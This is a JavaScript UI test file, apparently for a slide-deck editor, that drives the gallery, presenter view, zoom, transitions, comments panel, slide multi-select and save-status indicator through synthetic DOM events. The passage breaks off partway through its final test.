    const cards = _$$("[style*='width: 224px'], [style*='width:224px']");
    return cards.length > 0 || _$$("div").filter(d => d.style?.width === "224px").length > 0;
  }},
  { name: "Current slide highlighted", fn: async () => {
    // Look for a card with accent border
    const highlighted = _$$("div").find(d => d.style?.borderColor && d.style.borderColor.includes("59, 130, 246"));
    return !!highlighted;
  }},
  { name: "Hint text visible", fn: async () => {
    await _waitFor(() => _$text("G or ESC to close"), 1000);
  }},
  { name: "Click card navigates", fn: async () => {
    // Click a real gallery card by its stable data-testid (the clickable card div,
    // part-slides.jsx). Clicking it runs jump() -> SELECT + SET_SLIDE_INDEX + onClose,
    // so the gallery closes. (Previously this hunted a mono "2" span + a cursor-style
    // substring, which could match a non-card span and silently no-op.)
    const cards = _$$("[data-testid='gallery-slide']");
    if (!cards.length) throw new Error("no gallery-slide cards rendered");
    _click(cards[0]);
    await _waitFor(() => !_$text("GALLERY"), 1500).catch(() => {});
    return !_$text("GALLERY");
  }},
  { name: "G key toggles gallery off", fn: async () => {
    document.activeElement?.blur(); await _wait(100);
    // Ensure we're not in gallery from a previous test
    if (_$text("GALLERY")) { _key("g"); await _waitFor(() => !_$text("GALLERY"), 1500).catch(() => {}); }
    document.activeElement?.blur(); await _wait(100);
    _key("g");
    await _waitFor(() => _$text("GALLERY"), 3000);
    document.activeElement?.blur(); await _wait(100);
    _key("g");
    await _waitFor(() => !_$text("GALLERY"), 3000);
  }},
  { name: "Exit fullscreen after gallery tests", fn: async () => {
    _key("f");
    await _waitFor(() => _$("header"));
  }},
]);

// ── CR-12: Gallery reachable from the editor (not just Present mode) ──
uiSuite("Gallery From Editor", [
  { name: "Editor is not in fullscreen/Present", fn: async () => {
    await _waitFor(() => _$("header"), 2000);
  }},
  { name: "Overview button visible in the SLIDE TOOLBAR", fn: async () => {
    await _waitFor(() => _$("[data-testid='editor-gallery-toggle']"), 2000);
  }},
  { name: "Clicking Overview opens the gallery grid with tiles", fn: async () => {
    const btn = _$("[data-testid='editor-gallery-toggle']");
    if (!btn) throw new Error("editor-gallery-toggle not found");
    _click(btn);
    await _waitFor(() => _$text("GALLERY"), 2000);
    // Scope to the gallery overlay itself — the editor's module list (still
    // mounted behind the overlay) has its own numbered mono-font badges that
    // would otherwise collide with an unscoped document-wide query.
    const root = _$("[data-teacher-panel]");
    if (!root) throw new Error("gallery overlay root not found");
    const cardCount = _$$("span", root).filter((s) => /^\d+$/.test(s.textContent?.trim()) && s.style?.fontFamily?.includes("mono")).length;
    if (cardCount === 0) throw new Error("gallery opened from editor but shows no slide tiles");
  }},
  { name: "Clicking a tile from the editor-opened gallery navigates", fn: async () => {
    const root = _$("[data-teacher-panel]");
    if (!root) throw new Error("gallery overlay root not found");
    const nums = _$$("span", root).filter((s) => /^\d+$/.test(s.textContent?.trim()) && s.style?.fontFamily?.includes("mono"));
    const card1 = nums.find((n) => n.textContent?.trim() === "1");
    if (!card1) throw new Error("tile '1' not found in gallery overlay");
    const cardEl = card1.closest("div[style*='cursor: pointer'], div[style*='cursor:pointer']");
    if (!cardEl) throw new Error("clickable card wrapper not found for tile '1'");
    _click(cardEl);
    await _wait(400);
    if (_$text("GALLERY")) throw new Error("gallery still open after selecting a tile");
    await _waitFor(() => _$("header"), 2000); // back in the editor, not fullscreen
  }},
  { name: "G key re-opens and Escape closes gallery from the editor", fn: async () => {
    document.activeElement?.blur(); await _wait(100);
    if (_$text("GALLERY")) { _key("g"); await _wait(400); } // ensure closed from a prior test
    document.activeElement?.blur(); await _wait(100);
    _key("g");
    await _waitFor(() => _$text("GALLERY"), 2000);
    _key("Escape");
    await _waitFor(() => !_$text("GALLERY"), 2000);
  }},
  { name: "CR1/D8: gallery page badge total excludes virtual title cards", fn: async () => {
    document.activeElement?.blur();
    for (let i = 0; i < 2; i++) { _key("Escape"); await _wait(80); }
    if (_$text("GALLERY")) { _key("g"); await _waitFor(() => !_$text("GALLERY"), 1500).catch(() => {}); }
    // Enable a title card on the first section so the gallery renders a 🎬 virtual card.
    const tc = _$$("span").find((s) => /Title card/i.test(s.title || ""));
    if (!tc) throw new Error("title-card 🎬 toggle not found in TOC");
    const wasOn = /ON/i.test(tc.title || "");
    if (!wasOn) { _click(tc); await _waitFor(() => _$$("span").some((s) => /Title card ON/i.test(s.title || "")), 1500); }
    // Open the gallery from the editor.
    const gbtn = await _waitFor(() => _$("[data-testid='editor-gallery-toggle']"), 2000);
    _click(gbtn);
    await _waitFor(() => _$text("GALLERY"), 2000);
    const root = await _waitFor(() => _$("[data-teacher-panel]"), 2000);
    await _wait(150);
    // The virtual title card must actually be present (else the total can't be inflated).
    if (_$$("[data-testid='gallery-title-card']", root).length === 0) throw new Error("no virtual title card rendered — cannot exercise the badge total");
    const realCards = _$$("[data-testid='gallery-slide']", root);
    const realCount = realCards.length;
    // A real thumbnail's page-number badge (NN / NN): its denominator must be the
    // REAL slide count, NOT inflated by the virtual title card(s) → matches presentation.
    const badgeTotalOf = (card) => { const el = _$$("*", card).find((e) => e.children.length === 0 && /^\d+\s*\/\s*\d+$/.test((e.textContent || "").trim())); return el ? parseInt((el.textContent || "").trim().split("/")[1], 10) : null; };
    let total = null;
    for (const c of realCards) { total = badgeTotalOf(c); if (total != null) break; }
    if (total == null) throw new Error("no page-number badge found on gallery thumbnails");
    if (total !== realCount) throw new Error(`gallery badge total ${total} != real slide count ${realCount} (virtual title cards leaked into the total)`);
    // Cleanup: close gallery + restore the title-card toggle to its prior state.
    _key("Escape"); await _waitFor(() => !_$text("GALLERY"), 2000).catch(() => {});
    if (!wasOn) { const t2 = _$$("span").find((s) => /Title card ON/i.test(s.title || "")); if (t2) { _click(t2); await _wait(120); } }
  }},
]);

// ── CR-08: Dedicated presenter/speaker view ──────────────────────────
uiSuite("Presenter View", [
  { name: "Enter fullscreen (Present) for presenter-view tests", fn: async () => {
    document.activeElement?.blur(); await _wait(100);
    _key("f");
    await _waitFor(() => !_$("header"), 2000);
  }},
  { name: "🗒️ presenter-view button visible in Present mode", fn: async () => {
    await _waitFor(() => _$("[data-testid='presenter-toggle']"), 2000);
  }},
  { name: "Present toolbar has no duplicate gallery icon or 🖥️ glyph", fn: async () => {
    if (_$("[data-testid='gallery-toggle']")) throw new Error("separate gallery icon still shown next to the view switch");
    const pt = _$("[data-testid='presenter-toggle']");
    if (/🖥/.test(pt.textContent || "")) throw new Error("presenter-view toggle reuses the 🖥️ Present glyph");
  }},
  { name: "S key opens presenter view: current + Next + notes + timer", fn: async () => {
    document.activeElement?.blur(); await _wait(100);
    _key("s");
    await _waitFor(() => _$("[data-testid='presenter-view']"), 2000);
    const timerEl = _$("[data-testid='presenter-timer']");
    if (!timerEl) throw new Error("presenter-timer not found");
    if (!/\d+:\d\d/.test(timerEl.textContent || "")) throw new Error("presenter timer text does not match mm:ss: " + timerEl.textContent);
    if (!_$("[data-testid='presenter-next']")) throw new Error("Next-slide preview region not found");
    if (!_$("[data-testid='presenter-notes']")) throw new Error("Speaker notes region not found");
  }},
  { name: "Timer keeps advancing (elapsed clock is live)", fn: async () => {
    const before = _$("[data-testid='presenter-timer']")?.textContent;
    await _wait(1200);
    const after = _$("[data-testid='presenter-timer']")?.textContent;
    if (before == null || after == null) throw new Error("presenter-timer disappeared");
    // Not a hard equality check (1s tick can be flaky under load) — just confirm it's still a valid mm:ss.
    if (!/\d+:\d\d/.test(after)) throw new Error("presenter timer stopped showing mm:ss: " + after);
  }},
  { name: "Arrow key advances the deck while presenter view is open", fn: async () => {
    const before = _slidePos();
    _key("ArrowRight"); await _wait(400);
    const after = _slidePos();
    if (before != null && after != null && after === before) throw new Error("ArrowRight did not advance slide with presenter view open");
  }},
  { name: "Presenter toggle button closes the view", fn: async () => {
    const btn = _$("[data-testid='presenter-toggle']");
    if (!btn) throw new Error("presenter-toggle not found");
    _click(btn);
    await _waitFor(() => !_$("[data-testid='presenter-view']"), 2000);
  }},
  { name: "Esc closes presenter view first, then exits Present mode", fn: async () => {
    document.activeElement?.blur(); await _wait(100);
    _key("s");
    await _waitFor(() => _$("[data-testid='presenter-view']"), 2000);
    _key("Escape");
    await _waitFor(() => !_$("[data-testid='presenter-view']"), 2000);
    await _wait(150);
    if (_$("header")) throw new Error("first Esc exited Present mode; it must only close presenter view");
    _key("Escape");
    await _waitFor(() => _$("header"), 2000);
  }},
]);

uiSuite("Present Esc closes image zoom only", [
  { name: "Esc on a zoomed block closes the zoom and stays in Present mode", fn: async () => {
    document.activeElement?.blur(); await _wait(100);
    _key("f");
    await _waitFor(() => !_$("header"), 2000);
    const zoomable = () => _$$("div").find((d) => d.style.cursor === "zoom-in" && d.getBoundingClientRect().width > 0);
    for (let i = 0; i < 30 && !zoomable(); i++) { _key("ArrowRight"); await _wait(250); }
    const src = zoomable();
    if (!src) throw new Error("no zoomable block found in the demo deck");
    _click(src);
    const zoomed = () => document.body.textContent.includes("ESC or click to close");
    await _waitFor(zoomed, 2000);
    // The overlay must fill the window, not the scaled slide canvas.
    const r = _$("[data-vela-zoom]").getBoundingClientRect();
    if (Math.abs(r.width - window.innerWidth) > 2 || Math.abs(r.height - window.innerHeight) > 2)
      throw new Error(`zoom overlay is ${Math.round(r.width)}x${Math.round(r.height)}, window is ${window.innerWidth}x${window.innerHeight}`);
    // Arrow keys stay on this slide: they step to another zoomable block, or
    // close the zoom past the last one (no wrap to the first).
    const before = _slidePos();
    const list = Array.from(src.closest("[data-vela-slide-content]").querySelectorAll("[data-vela-zoomable]"));
    const isLast = list.indexOf(src) === list.length - 1;
    _key("ArrowRight");
    await _wait(300);
    if (_slidePos() !== before) throw new Error("ArrowRight in zoom changed the slide");
    if (isLast && zoomed()) throw new Error("ArrowRight in zoom on the last zoomable block did not close the zoom");
    if (!isLast && !zoomed()) throw new Error("ArrowRight in zoom did not step to the next zoomable block");
    if (!zoomed()) { _click(src); await _waitFor(zoomed, 2000); }
    _key("Escape");
    await _waitFor(() => !zoomed(), 2000);
    await _wait(200);
    if (_$("header")) throw new Error("Esc on the zoom overlay also exited Present mode");
    // Browser-fullscreen path: the browser eats Esc and only fires fullscreenchange.
    const fsExit = () => document.dispatchEvent(new Event("fullscreenchange"));
    _click(zoomable());
    await _waitFor(zoomed, 2000);
    fsExit();
    await _waitFor(() => !zoomed(), 2000).catch(() => { throw new Error("browser fullscreen exit did not close the zoom"); });
    await _wait(200);
    if (_$("header")) throw new Error("browser fullscreen exit with a zoom open also exited Present mode");
    document.activeElement?.blur(); _key("s");
    await _waitFor(() => _$("[data-testid='presenter-view']"), 2000);
    fsExit();
    await _waitFor(() => !_$("[data-testid='presenter-view']"), 2000);
    await _wait(200);
    if (_$("header")) throw new Error("browser fullscreen exit with presenter view open also exited Present mode");
    fsExit();
    await _waitFor(() => _$("header"), 2000);
  }},
]);

// ── CR-09: Deck-level slide transition on advance ────────────────────
uiSuite("Slide Transitions", [
  { name: "Enter fullscreen for transition tests", fn: async () => {
    document.activeElement?.blur(); await _wait(100);
    _key("f");
    await _waitFor(() => !_$("header"), 2000);
  }},
  { name: "slide-transition-fade wrapper present on the active slide", fn: async () => {
    await _waitFor(() => _$(".slide-transition-fade"), 2000);
  }},
  { name: "Transition wrapper remounts (fresh play) on slide advance", fn: async () => {
    const before = _$(".slide-transition-fade");
    if (!before) throw new Error("no .slide-transition-fade element before advancing");
    _key("ArrowRight");
    await _waitFor(() => {
      const el = _$(".slide-transition-fade");
      return el && el !== before;
    }, 2000);
  }},
  { name: "Per-block stagger (.stg-N) still present alongside the deck transition", fn: async () => {
    await _waitFor(() => _$$("[class^='stg-']").length > 0, 2000);
  }},
  { name: "Exit fullscreen after transition tests", fn: async () => {
    _key("f");
    await _waitFor(() => _$("header"));
  }},
]);

// ── Review / Comments Suite ─────────────────────────────────────────
// Review mode exposes no button-state signal — the header "💬 Comments" button
// keeps its emoji whether review is on or off — so detect actual state from the
// COMMENTS panel and toggle only when needed. Keeps the Review tests order-robust
// so a prior test's residual mode can't flip the next test's toggle.
const _reviewPanelOpen = () => !!_$text("COMMENTS");
const _reviewToggleBtn = () => _$$("button").find((b) => (b.textContent || "").includes("Comments") && (b.textContent || "").includes("💬"));
const _setReviewMode = async (on) => {
  if (_reviewPanelOpen() === on) return;
  const btn = _reviewToggleBtn();
  if (btn) { _click(btn); await _waitFor(() => _reviewPanelOpen() === on, 1500).catch(() => {}); }
};

uiSuite("Review", [
  { name: "Review button visible in header", fn: async () => {
    await _waitFor(() => _$$("button").find((b) => (b.textContent || "").includes("Comments")));
  }},
  { name: "Review button toggles review mode", fn: async () => {
    document.activeElement?.blur(); await _wait(100);
    const btn = _$$("button").find((b) => (b.textContent || "").includes("Comments") && (b.textContent || "").includes("💬"));
    if (!btn) throw new Error("Review button not found");
    _click(btn); await _wait(300);
    // Comments panel should open — look for COMMENTS header
    const panel = await _waitFor(() => _$text("COMMENTS"), 2000).catch(() => null);
    if (!panel) throw new Error("Comments panel did not open");
  }},
  { name: "Comments panel shows filter tabs", fn: async () => {
    await _waitFor(() => {
      const all = document.body.textContent || "";
      return all.includes("Open") && all.includes("Done");
    }, 1000);
  }},
  { name: "Comments panel has Copy for Agent button", fn: async () => {
    await _waitFor(() => _$$("button").find((b) => (b.textContent || "").includes("Copy for Agent")));
  }},
  { name: "Comments panel has Resolve All button", fn: async () => {
    await _waitFor(() => _$$("button").find((b) => (b.textContent || "").includes("Resolve All")));
  }},
  { name: "Comments panel has Clear Done button", fn: async () => {
    await _waitFor(() => _$$("button").find((b) => (b.textContent || "").includes("Clear Done")));
  }},
  { name: "Module comment icon visible in review mode (💬)", fn: async () => {
    // 💬 module icon only shows in review mode — ensure review is actually on
    // (independent of whatever state a prior test left behind).
    await _setReviewMode(true);
    await _waitFor(() => _$$("span").find((s) => s.textContent?.includes("💬") && s.style?.cursor === "pointer"), 1000);
    // Return to editor mode for the following tests.
    await _setReviewMode(false);
  }},
  { name: "Module comment icon hidden in editor mode", fn: async () => {
    // In editor mode (review off), 💬 toggle should NOT be in the module list
    await _wait(200);
    const commentIcon = _$$("span").find((s) => s.textContent?.includes("💬") && s.style?.cursor === "pointer" && !s.closest("button"));
    if (commentIcon) throw new Error("💬 icon should be hidden in editor mode");
  }},
  { name: "Review mode exit closes panel", fn: async () => {
    const btn = _$$("button").find((b) => (b.textContent || "").includes("Comments") && (b.textContent || "").includes("💬"));
    if (!btn) throw new Error("Review button not found");
    _click(btn); await _wait(300);
    // Panel should be gone
    await _wait(200);
    const panel = _$text("COMMENTS");
    // May still be visible briefly — just verify no crash
  }},
  { name: "R key toggles review mode", fn: async () => {
    // Start from a known-off state so the first `r` deterministically opens.
    await _setReviewMode(false);
    document.activeElement?.blur(); await _wait(100);
    _key("r");
    const panel = await _waitFor(() => _$text("COMMENTS"), 2000).catch(() => null);
    if (!panel) throw new Error("R key did not open comments panel");
    // Toggle off
    _key("r");
    await _waitFor(() => !_$text("COMMENTS"), 1500).catch(() => {});
  }},
  { name: "Review mode and Vera are mutually exclusive", fn: async () => {
    // Open review (only if not already on — the button emoji isn't a state signal)
    await _setReviewMode(true);
    // Now open Vera — should close review
    const veraBtn = _$$("button").find((b) => (b.textContent || "").includes("Vera") && (b.textContent || "").includes("🤖"));
    if (veraBtn) { _click(veraBtn); await _waitFor(() => !!(_$$("textarea").find((t) => { const ph = t.placeholder?.toLowerCase() || ""; return ph.includes("tell vera") || ph.includes("paste images"); }) || _$$("span").find((s) => s.textContent?.trim() === "VERA")), 1500).catch(() => {}); }
    // Vera open? Use the same robust signal as the Chat suite — the textarea
    // placeholder is AI-state dependent (keyless builds show "AI features not
    // enabled"), so accept the "VERA" panel header as the open signal too.
    const veraOpen = !!(_$$("textarea").find((t) => {
      const ph = t.placeholder?.toLowerCase() || "";
      return ph.includes("tell vera") || ph.includes("paste images");
    }) || _$$("span").find((s) => s.textContent?.trim() === "VERA"));
    // Mutual exclusion: opening Vera must have closed the review (COMMENTS) panel.
    const reviewClosed = !_reviewPanelOpen();
    // Close Vera
    if (veraBtn) { _click(veraBtn); await _wait(200); }
    if (!veraOpen) throw new Error("Vera panel didn't open when switching from Review");
    if (!reviewClosed) throw new Error("Review panel stayed open — not mutually exclusive with Vera");
  }},
  { name: "Comment badge click opens comments panel", fn: async () => {
    // Ensure review mode is off first
    document.activeElement?.blur(); await _wait(100);
    // Look for the amber comment count badge on the slide canvas (top-right circle)
    const badge = _$$("div").find((d) => d.style?.borderRadius === "11px" && d.style?.background && d.style?.cursor === "pointer" && d.style?.position === "absolute");
    if (badge) {
      _click(badge);
      const panel = await _waitFor(() => _$text("COMMENTS"), 2000).catch(() => null);
      if (!panel) throw new Error("Clicking comment badge did not open comments panel");
      // Close review mode
      const reviewBtn = _$$("button").find((b) => (b.textContent || "").includes("Comments") && (b.textContent || "").includes("💬"));
      if (reviewBtn) { _click(reviewBtn); await _wait(300); }
    }
    // If no badge, test passes (no comments on current slide)
  }},
], { setup: _selectFirstModule });

// ── Sprint 7-1 UX batch ──────────────────────────────────────────────
// Header slide count parsed from the header stat pill ("⏱24m · 28sl · 13§").
const _headerSlideCount = () => {
  const hdr = _$("header");
  if (!hdr) return null;
  const el = _$$("span", hdr).find((e) => /\d+sl\b/.test(e.textContent || ""));
  const m = el && (el.textContent || "").match(/(\d+)sl/);
  return m ? parseInt(m[1], 10) : null;
};

uiSuite("Header & Stats (7-1)", [
  { name: "Header shows minutes + slide count", fn: async () => {
    const pill = await _waitFor(() => { const h = _$("header"); return h && _$$("span", h).find((e) => /\d+m\b/.test(e.textContent || "") && /\d+sl\b/.test(e.textContent || "")); });
    if (/\d+m\s*\d+s/.test(pill.textContent)) throw new Error("header still shows seconds: " + pill.textContent);
  }},
  { name: "Header pill opens the Deck stats dialog", fn: async () => {
    const pill = await _waitFor(() => { const h = _$("header"); return h && _$$("span", h).find((e) => /\d+sl\b/.test(e.textContent || "") && /§/.test(e.textContent || "")); });
    _click(pill);
    await _waitFor(() => _$$("*").find((e) => e.children.length === 0 && /Deck stats/i.test(e.textContent || "")));
    _key("Escape");
    await _wait(150);
  }},
]);

uiSuite("Hide slides (7-1)", [
  { name: "Eye toggle hides a slide and updates the count", fn: async () => {
    const eye = await _waitFor(() => _$$("span").find((e) => (e.title || "").startsWith("Hide slide")));
    const before = _headerSlideCount();
    if (before == null) throw new Error("no header slide count");
    _click(eye);
    await _waitFor(() => _headerSlideCount() === before - 1, 2000);
    // restore
    const unhide = await _waitFor(() => _$$("span").find((e) => (e.title || "").startsWith("Hidden")));
    _click(unhide);
    await _waitFor(() => _headerSlideCount() === before, 2000);
  }},
]);

uiSuite("Add menu (7-1)", [
  { name: "Add affordance offers Blank / AI / Section", fn: async () => {
    const add = await _waitFor(() => _$$("*").find((e) => e.children.length === 0 && /＋\s*add|＋\s*Add slide/.test(e.textContent || "")));
    _click(add);
    await _waitFor(() => {
      const btns = _$$("button").map((b) => (b.textContent || "").trim());
      return btns.some((t) => /Blank/.test(t)) && btns.some((t) => /Section/.test(t)) && btns.some((t) => /AI/.test(t));
    }, 2000);
    // close the menu
    const x = _$$("button").find((b) => (b.textContent || "").trim() === "✕");
    if (x) _click(x);
    await _wait(120);
  }},
]);

uiSuite("Section drag reorder (7-1)", [
  { name: "Dragging a section changes the order", fn: async () => {
    const rows = () => _$$(".concept-row");
    const titleOf = (r) => { const s = _$$("span", r).find((x) => parseInt(x.style.fontWeight) >= 600); return (s ? s.textContent : r.textContent || "").trim().slice(0, 30); };
    const before = rows().map(titleOf);
    if (before.length < 3) throw new Error("need >=3 sections");
    const src = rows()[0], dst = rows()[2];
    const dt = new DataTransfer();
    const fire = (el, type, extra) => el.dispatchEvent(new DragEvent(type, Object.assign({ bubbles: true, cancelable: true, dataTransfer: dt }, extra)));
    const db = dst.getBoundingClientRect();
    fire(src, "dragstart");
    fire(dst, "dragover", { clientX: db.x + db.width / 2, clientY: db.y + db.height - 3 });
    fire(dst, "drop", { clientX: db.x + db.width / 2, clientY: db.y + db.height - 3 });
    fire(src, "dragend");
    await _waitFor(() => JSON.stringify(rows().map(titleOf)) !== JSON.stringify(before), 2000);
    // drag it back to restore original order
    const r2 = rows(); const s2 = r2.find((r) => titleOf(r) === before[0]); const d2 = r2[0];
    if (s2 && d2 && s2 !== d2) {
      const dt2 = new DataTransfer();
      const fire2 = (el, type, extra) => el.dispatchEvent(new DragEvent(type, Object.assign({ bubbles: true, cancelable: true, dataTransfer: dt2 }, extra)));
      const b2 = d2.getBoundingClientRect();
      fire2(s2, "dragstart"); fire2(d2, "dragover", { clientX: b2.x + 5, clientY: b2.y + 2 }); fire2(d2, "drop", { clientX: b2.x + 5, clientY: b2.y + 2 }); fire2(s2, "dragend");
      await _wait(150);
    }
  }},
]);

uiSuite("Section collapse-all (Ctrl-click) — v13.15", [
  { name: "Ctrl-click collapses/expands every section, plain click affects only one", fn: async () => {
    const rows = () => _$$(".concept-row");
    // The collapse arrow is the row's first <span> (rendered before the imp-dot
    // div and title), identifiable by its rotate() transform.
    const toggles = () => rows().map((r) => r.querySelector("span"));
    const isCollapsed = (span) => /rotate\(-90deg\)/.test(span.style.transform || "");
    if (rows().length < 2) throw new Error("need >=2 sections");
    // Plain click collapses only the clicked section.
    _click(toggles()[0]);
    await _wait(150);
    let states = toggles().map(isCollapsed);
    if (!states[0]) throw new Error("plain click did not collapse the clicked section");
    if (states.slice(1).some(Boolean)) throw new Error("plain click affected other sections");
    _click(toggles()[0]); // restore
    await _wait(150);
    // Ctrl-click collapses ALL sections.
    _clickMod(toggles()[0], { ctrlKey: true });
    await _wait(150);
    states = toggles().map(isCollapsed);
    if (!states.every(Boolean)) throw new Error("ctrl-click did not collapse all sections");
    // Ctrl-click again expands ALL sections.
    _clickMod(toggles()[0], { ctrlKey: true });
    await _wait(150);
    states = toggles().map(isCollapsed);
    if (states.some(Boolean)) throw new Error("ctrl-click did not expand all sections");
  }},
]);

uiSuite("Presenter Ctrl+E (7-1)", [
  { name: "Ctrl+E toggles the TOC search pane", fn: async () => {
    try { document.activeElement?.blur?.(); } catch {}
    const isFs = () => !!_$("[style*='position: fixed']");
    // Ensure we are IN fullscreen (a prior suite may have left it toggled either way).
    for (let i = 0; i < 3 && !isFs(); i++) { _key("f"); await _waitFor(isFs, 1200).catch(() => {}); }
    if (!isFs()) throw new Error("could not enter fullscreen");
    const tocOpen = () => { const i = _$$("input").find((x) => /search slides/i.test(x.placeholder || "")); return i && i.getBoundingClientRect().x > -50; };
    _key("e", { ctrlKey: true });
    await _waitFor(tocOpen, 2500);
    _key("e", { ctrlKey: true });
    await _waitFor(() => !tocOpen(), 2500);
    _key("Escape"); await _wait(300); if (isFs()) { _key("Escape"); await _wait(200); }
  }},
]);

// ── Multi-select / Context menu / Move picker (Features 4–6) ──────────
// Dispatch a native click carrying keyboard modifiers (React onClick reads them).
const _clickMod = (el, opts = {}) => {
  if (!el) throw new Error("clickMod: element not found");
  el.dispatchEvent(new MouseEvent("click", { bubbles: true, cancelable: true, ...opts }));
  return el;
};
const _rightClick = (el, x = 120, y = 120) => {
  if (!el) throw new Error("rightClick: element not found");
  el.dispatchEvent(new MouseEvent("contextmenu", { bubbles: true, cancelable: true, clientX: x, clientY: y }));
  return el;
};
const _tocRows = () => _$$('[data-testid="toc-slide-row"]');
// A prior suite may leave the app in Vela fullscreen (a fixed inset:0 overlay at
// a high z-index showing the "N / N" slide counter). Toggle out with 'f' so the
// editor's SlidePanel toolbar actually renders for these suites.
const _exitFullscreen = async () => {
  const inFs = () => _$$("div").some((d) => d.style.position === "fixed" && d.style.inset === "0px" && parseInt(d.style.zIndex || "0", 10) >= 999 && /\d+\s*\/\s*\d+/.test(d.textContent || ""));
  for (let i = 0; i < 3 && inFs(); i++) { document.activeElement?.blur?.(); _key("f"); await _waitFor(() => !inFs(), 1500).catch(() => {}); }
};
const _editorSetup = async () => { await _exitFullscreen(); await _selectFirstModule(); };

uiSuite("Slide Multi-select (F4)", [
  { name: "cmd-click selects multiple slide rows", fn: async () => {
    const rows = _tocRows();
    if (rows.length < 2) { return; } // module with <2 slides — soft pass
    _click(rows[0]); await _wait(120);
    _clickMod(rows[1], { metaKey: true }); await _wait(150);
    const selCount = _tocRows().filter((r) => r.getAttribute("data-selected") === "true").length;
    if (selCount < 2) throw new Error("expected >=2 rows data-selected, got " + selCount);
    // plain click collapses back to a single selection
    _click(rows[0]); await _wait(150);
    const after = _tocRows().filter((r) => r.getAttribute("data-selected") === "true").length;
    if (after > 1) throw new Error("plain click did not clear multi-selection, got " + after);
  }},
  { name: "shift-click selects a contiguous range", fn: async () => {
    const rows = _tocRows();
    if (rows.length < 3) { return; }
    _click(rows[0]); await _wait(120);
    _clickMod(rows[2], { shiftKey: true }); await _wait(150);
    const selCount = _tocRows().filter((r) => r.getAttribute("data-selected") === "true").length;
    if (selCount < 3) throw new Error("shift-range expected >=3 selected, got " + selCount);
    _click(rows[0]); await _wait(120);
  }},
], { setup: _editorSetup });

uiSuite("Slide Context Menu (F5)", [
  { name: "right-click opens the slide context menu", fn: async () => {
    const rows = _tocRows();
    if (rows.length === 0) throw new Error("no slide rows");
    _rightClick(rows[0]);
    const menu = await _waitFor(() => _$('[data-testid="toc-context-menu"]'), 2000);
    for (const tid of ["ctx-move", "ctx-duplicate", "ctx-delete", "ctx-hide"]) {
      if (!menu.querySelector(`[data-testid="${tid}"]`)) throw new Error("missing menu item " + tid);
    }
    _key("Escape");
    await _waitFor(() => !_$('[data-testid="toc-context-menu"]'), 2000);
  }},
  { name: "Move submenu shows the section picker", fn: async () => {
    const rows = _tocRows();
    if (rows.length === 0) throw new Error("no slide rows");
    _rightClick(rows[0]);
    const menu = await _waitFor(() => _$('[data-testid="toc-context-menu"]'), 2000);
    _click(menu.querySelector('[data-testid="ctx-move"]'));
    // section picker (may be empty if only one module) — search input appears
    await _waitFor(() => _$('[data-testid="section-search"]') || _$text("No other sections"), 2000).catch(() => {});
    _key("Escape");
    await _waitFor(() => !_$('[data-testid="toc-context-menu"]'), 2000).catch(() => {});
    document.activeElement?.blur?.();
  }},
], { setup: _editorSetup });

uiSuite("Move Picker Search (F6)", [
  { name: "move picker has search + wide scroll + wheel isolation", fn: async () => {
    // Ensure the slide editor toolbar is on screen (click the active slide row).
    const rows = _tocRows();
    if (rows.length > 0) { _click(rows[0]); await _wait(150); }
    const findMove = () => _$$("button").find((b) => b.title?.includes("Move to module") || (b.textContent?.includes("📦") && /Move/.test(b.textContent || "")));
    const btn = await _waitFor(findMove, 2500);
    _click(btn);
    const search = await _waitFor(() => _$('[data-testid="section-search"]'), 2000).catch(() => null);
    if (!search) { // no other modules — close and soft pass
      const bd = _$$("div").find((d) => d.style.position === "fixed" && d.style.inset === "0px" && d.style.zIndex === "9998");
      if (bd) _click(bd); await _wait(150); return;
    }
    const list = _$('[data-testid="section-picker-list"]');
    if (!list || !list.className.includes("vela-wide-scroll")) throw new Error("picker list missing wide-scroll class");
    if (list.getAttribute("data-scroll-container") == null) throw new Error("picker list not marked data-scroll-container");
    const before = _$$('[data-testid="section-picker-item"]').length;
    _type(search, "zzzznomatch"); await _wait(200);
    const filtered = _$$('[data-testid="section-picker-item"]').length;
    if (before > 0 && filtered !== 0) throw new Error("search did not filter (before " + before + ", after " + filtered + ")");
    _type(search, ""); await _wait(150);
    const bd = _$$("div").find((d) => d.style.position === "fixed" && d.style.inset === "0px" && d.style.zIndex === "9998");
    if (bd) _click(bd); await _wait(150);
  }},
], { setup: _editorSetup });

// Desktop save-status pill (CR3) — the "no hint or error" half of the Windows
// silent-save bug. Drives the app's save-status channel (window.__velaOnSaveStatus,
// wired by the app effect; nl-boot feeds it from deck-io on the real desktop) and
// asserts the pill's state machine + the Retry affordance. Stable test-ids:
//   save-status-pill  (data-save-state = saving|saved|failed|reconnecting)
//   save-status-retry / save-failed-toast / save-failed-toast-retry
const _savePill = () => _$('[data-testid="save-status-pill"]');
const _saveState = () => { const p = _savePill(); return p ? p.getAttribute("data-save-state") : null; };
uiSuite("Desktop save-status pill (CR3)", [
  { name: "channel wired: window.__velaOnSaveStatus is a function", fn: async () => {
    if (typeof window.__velaOnSaveStatus !== "function") throw new Error("save-status channel not wired");
  }},
  { name: "saving → saved renders the pill with 'Saved' copy", fn: async () => {
    window.__velaOnSaveStatus({ state: "saving", at: Date.now() });
    await _waitFor(() => _saveState() === "saving", 2000);
    window.__velaOnSaveStatus({ state: "saved", at: Date.now() });
    const pill = await _waitFor(() => (_saveState() === "saved" ? _savePill() : null), 2000);
    if (!/Saved/.test(pill.textContent || "")) throw new Error("saved pill missing copy: " + pill.textContent);
  }},
  { name: "failed save surfaces a Retry pill + one-shot toast (not swallowed)", fn: async () => {
    window.__velaOnSaveStatus({ state: "failed", at: Date.now(), error: "mock write reject" });
    const pill = await _waitFor(() => (_saveState() === "failed" ? _savePill() : null), 2000);
    if (!/Retry/i.test(pill.textContent || "")) throw new Error("failed pill missing Retry: " + pill.textContent);
    await _waitFor(() => _$('[data-testid="save-failed-toast"]'), 2000);
  }},
  { name: "Retry invokes __velaForceSave and returns to Saved", fn: async () => {
    const orig = window.__velaForceSave;
    let called = 0;
    window.__velaForceSave = () => { called++; window.__velaOnSaveStatus({ state: "saved", at: Date.now() }); };
    try {
      window.__velaOnSaveStatus({ state: "failed", at: Date.now() });
      const pill = await _waitFor(() => (_saveState() === "failed" ? _savePill() : null), 2000);
      _click(pill);
      if (called < 1) throw new Error("__velaForceSave was not called by Retry");
      await _waitFor(() => _saveState() === "saved", 2000);
    } finally {
      window.__velaForceSave = orig;
    }
  }},
  { name: "D6: dismissed toast does NOT re-arm on reconnecting→failed (only a real save re-arms)", fn: async () => {
    const toast = () => _$('[data-testid="save-failed-toast"]');
